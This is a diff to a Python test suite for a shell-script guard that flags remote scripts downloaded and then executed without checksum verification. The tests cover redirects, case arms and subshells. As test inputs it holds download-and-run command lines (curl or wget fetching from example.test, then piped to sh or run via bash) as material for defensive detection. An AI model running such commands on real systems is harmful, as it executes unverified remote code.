@@ -143,6 +143,121 @@ class TestFetchParsing(unittest.TestCase):
         self.assertEqual([], wg.fetches("make test\nchmod +x ./run.sh\n"))
 
 
+class TestStderrRedirectsAreNotTheDestination(unittest.TestCase):
+    """#1733 (COD-C2C): `stage.writes[-1]` used to overwrite a correctly
+    parsed `-o`/`-O` destination with whatever a trailing `2>&1` or
+    `2>/dev/null` happened to file as a write, so an ordinary stderr redirect
+    on a fetch line silently defeated the guard. `shell_reader`'s own spec for
+    the parser change is in tests/test_shell_reader.py; these are the
+    guard-level shapes the issue named."""
+
+    def one(self, script):
+        found = wg.fetches(script)
+        self.assertEqual(1, len(found), "expected exactly one fetch in %r, got %r"
+                         % (script, found))
+        return found[0]
+
+    def test_a_stderr_redirect_after_the_output_flag_does_not_replace_the_dest(self):
+        fetch = self.one(
+            "curl -fsSL https://example.test/install.sh -o /tmp/i.sh 2>/dev/null\n")
+        self.assertEqual("/tmp/i.sh", fetch.dest)
+
+    def test_that_shape_is_still_caught_end_to_end(self):
+        script = ("curl -fsSL https://example.test/install.sh -o /tmp/i.sh "
+                  "2>/dev/null && bash /tmp/i.sh\n")
+        why = wg.fetch_exec_defect(script)
+        self.assertIsNotNone(why)
+        self.assertIn("/tmp/i.sh", why)
+
+    def test_fd_duplication_after_the_output_flag_does_not_replace_the_dest(self):
+        fetch = self.one(
+            "curl -fsSL https://example.test/i.sh -o /tmp/i.sh 2>&1 | tee log\n")
+        self.assertEqual("/tmp/i.sh", fetch.dest)
+
+    def test_that_shape_is_still_caught_end_to_end_too(self):
+        script = ("curl -fsSL https://example.test/i.sh -o /tmp/i.sh 2>&1 | "
+                  "tee log && sh /tmp/i.sh\n")
+        why = wg.fetch_exec_defect(script)
+        self.assertIsNotNone(why)
+        self.assertIn("/tmp/i.sh", why)
+
+    def test_a_stdout_redirect_followed_by_a_stderr_dup_still_names_the_file(self):
+        fetch = self.one("curl -fsSL https://example.test/i.sh > /tmp/i.sh 2>&1\n")
+        self.assertEqual("/tmp/i.sh", fetch.dest)
+
+    def test_that_shape_is_caught_end_to_end_with_a_semicolon(self):
+        script = "curl -fsSL https://example.test/i.sh > /tmp/i.sh 2>&1; sh /tmp/i.sh\n"
+        why = wg.fetch_exec_defect(script)
+        self.assertIsNotNone(why)
+        self.assertIn("/tmp/i.sh", why)
+
+    def test_a_bare_fd_dup_with_no_output_flag_stays_stdout(self):
+        # No file at all -- the destination stays what it always was
+        # (stdout), not the literal `&2`.
+        fetch = self.one("curl -fsSL https://example.test/i.sh >&2\n")
+        self.assertIsNone(fetch.dest)
+
+    def test_that_shape_stays_clean_with_no_pipe(self):
+        # Regression guard: nothing landed on disk and nothing consumed the
+        # stream, so this is not the rule's business, same as before #1733.
+        self.assertIsNone(
+            wg.fetch_exec_defect("curl -fsSL https://example.test/i.sh >&2\n"))
+
+    def test_wget_piped_to_sh_with_a_stderr_redirect_is_still_caught(self):
+        # The headline pipe-to-shell shape must survive the fix untouched.
+        script = "wget -qO- https://example.test/i.sh 2>/dev/null | sh\n"
+        fetch = self.one(script)
+        self.assertIsNone(fetch.dest)
+        self.assertEqual(("sh",), fetch.piped_to)
+        why = wg.fetch_exec_defect(script)
+        self.assertIsNotNone(why)
+        self.assertIn("sh", why)
+
+    def test_a_stderr_redirect_with_no_output_flag_does_not_become_the_dest(self):
+        fetch = self.one("curl -fsSL https://example.test/i.sh 2>err.log\n")
+        self.assertIsNone(fetch.dest)
+
+    def test_combined_stream_redirects_are_a_real_destination(self):
+        # Round 1 fix (opus review on 435e6f6): `&>word` / `&>>word` /
+        # unnumbered `>&word` (attached or spaced) are bash's `>word 2>&1`
+        # shorthand -- a REAL destination, caught the same as an explicit
+        # `-o`. At the reviewed head every one of these five reported clean.
+        for script in (
+            "curl -fsSL https://example.test/i.sh &>/tmp/i.sh\n",
+            "curl -fsSL https://example.test/i.sh &> /tmp/i.sh\n",
+            "curl -fsSL https://example.test/i.sh &>>/tmp/i.sh\n",
+            "curl -fsSL https://example.test/i.sh >&/tmp/i.sh\n",
+            "curl -fsSL https://example.test/i.sh >& /tmp/i.sh\n",
+        ):
+            fetch = self.one(script)
+            self.assertEqual("/tmp/i.sh", fetch.dest, script)
+            why = wg.fetch_exec_defect(script + "sh /tmp/i.sh\n")
+            self.assertIsNotNone(why, script)
+            self.assertIn("/tmp/i.sh", why, script)
+
+    def test_the_exact_reported_reproduction_is_caught(self):
+        why = wg.fetch_exec_defect(
+            "curl https://example.test/i.sh &> /tmp/i.sh && sh /tmp/i.sh\n")
+        self.assertIsNotNone(why)
+        self.assertIn("/tmp/i.sh", why)
+
+    def test_a_stdout_redirect_to_dev_stderr_still_means_nothing_was_written(self):
+        # NIT fix (round 1): `/dev/stderr` means "nothing was written" only
+        # when a STDOUT REDIRECT landed there.
+        fetch = self.one("curl -fsSL https://example.test/i.sh > /dev/stderr\n")
+        self.assertIsNone(fetch.dest)
+
+    def test_an_explicit_dest_of_dev_stderr_is_still_caught(self):
+        # NIT fix (round 1): unlike a redirect, `-o /dev/stderr` really did
+        # write there -- reverting the STDOUT-tuple shortcut must not also
+        # silence this, which was caught before #1733 touched STDOUT.
+        fetch = self.one("curl -fsSL https://example.test/i.sh -o /dev/stderr\n")
+        self.assertEqual("/dev/stderr", fetch.dest)
+        why = wg.fetch_exec_defect(
+            "curl -fsSL https://example.test/i.sh -o /dev/stderr\nsh /dev/stderr\n")
+        self.assertIsNotNone(why)
+
+
 class TestVerificationBinding(unittest.TestCase):
     """What the parser ACCEPTS: a checksum bound to the fetched path, run
     before the bytes are used. Everything else is theatre."""
@@ -817,6 +932,34 @@ class TestABranchIsNotAlwaysTaken(unittest.TestCase):
             self.FETCH + "case $x in\n a)\n   :\n   ;;\nesac\n" +
             self.CHECK + self.EXEC))
 
+    # Every terminator that ENDS an arm, not just `;;`. Reading only `;;`
+    # left the parser expecting a body, so the next arm's `b)` closed a
+    # subshell that was never opened and `b` became the command -- which
+    # SHADOWED the `curl` behind it, and a guard that sees no download
+    # reports a clean step (fix round on #1714, Critical 2).
+    TERMINATORS = (";;", ";&", ";;&")
+
+    def test_a_terminator_does_not_hide_the_next_arms_command(self):
+        for terminator in self.TERMINATORS:
+            script = ("case $x in a) echo hi %s b) %s esac\n"
+                      % (terminator, self.FETCH.replace("\n", " ;; ")))
+            with self.subTest(terminator=terminator):
+                fetches = wg.fetches(script)
+                self.assertEqual(1, len(fetches), fetches)
+                self.assertEqual("/tmp/payload", fetches[0].dest)
+
+    def test_a_terminator_still_opens_a_NEW_arm(self):
+        # The other half: the reset has to put a BOUNDARY there too, or a
+        # check in one arm clears a use in the next. `;&` falls through at
+        # run time, but only when the FIRST pattern matched -- arriving at
+        # `b)` directly runs no check at all, so the arms stay separate.
+        for terminator in self.TERMINATORS:
+            script = ("case $x in\n a)\n   " + self.FETCH + "   " +
+                      self.CHECK + "   " + terminator + "\n b)\n   " +
+                      self.EXEC + "   ;;\nesac\n")
+            with self.subTest(terminator=terminator):
+                self.assertIsNotNone(wg.fetch_exec_defect(script))
+
     def test_the_message_says_it_was_the_branch(self):
         why = wg.fetch_exec_defect(
             self.FETCH + "if true; then\n" + self.CHECK + "fi\n" + self.EXEC)
@@ -975,18 +1118,34 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
                               'curl -sfL https://example.test/p -o "$DEST"\n'),
                       ("run", "chmod +x /tmp/payload\n/tmp/payload\n"))
 
-    # A subshell written tight: the reader has no paren grammar, so `(curl`
-    # is one word and the fetch at its head is unseen; the spaced spelling is
-    # read. KEPT -- closing it is a grouping model the flat reader lacks.
-    def test_a_fetch_at_the_head_of_a_tight_subshell_is_unseen(self):
+    # Grouping parentheses are read with or without surrounding whitespace.
+    def test_a_fetch_at_the_head_of_a_tight_subshell_is_read(self):
         tight = "(curl -sfL https://example.test/payload -o /tmp/payload || true)\n"
-        self.assertEqual([], wg.fetches(tight))
-        self.accepted(("get", tight), ("run", "chmod +x /tmp/payload\n"))
+        self.assertEqual(1, len(wg.fetches(tight)), wg.fetches(tight))
+        self.flagged(("get", tight), ("run", "chmod +x /tmp/payload\n"))
 
     def test_the_same_subshell_with_a_space_is_read(self):
         spaced = "( curl -sfL https://example.test/payload -o /tmp/payload || true )\n"
         self.assertEqual(1, len(wg.fetches(spaced)), wg.fetches(spaced))
         self.flagged(("get", spaced), ("run", "chmod +x /tmp/payload\n"))
+
+    def test_nested_grouping_and_case_alternatives_keep_the_fetch(self):
+        for script in (
+                "( (curl -sfL https://example.test/payload -o /tmp/payload))\n",
+                "(case x in x|y) (curl -sfL https://example.test/payload -o /tmp/payload);; esac)\n",
+                "case x in (x|y) (curl -sfL https://example.test/payload -o /tmp/payload);; esac\n"):
+            with self.subTest(script=script):
+                self.assertEqual(1, len(wg.fetches(script)))
+                self.flagged(("get", script), ("run", "chmod +x /tmp/payload\n"))
+
+    def test_quoted_and_escaped_parentheses_stay_literal(self):
+        for script in ('echo "(curl -sfL https://example.test/x)"\n',
+                       r'\(curl -sfL https://example.test/x\)' + '\n'):
+            with self.subTest(script=script):
+                self.assertEqual([], wg.fetches(script))
+        fetch = wg.fetches('(curl -sfL "https://example.test/(payload)" -o /tmp/payload)')[0]
+        self.assertEqual(fetch.url, "https://example.test/(payload)")
+        self.assertEqual(fetch.dest, "/tmp/payload")
 
     # 3. what runs inside a container. CLOSED for the shape the fleet can
     # reach -- a bind mount and an interpreter operand -- because the reader
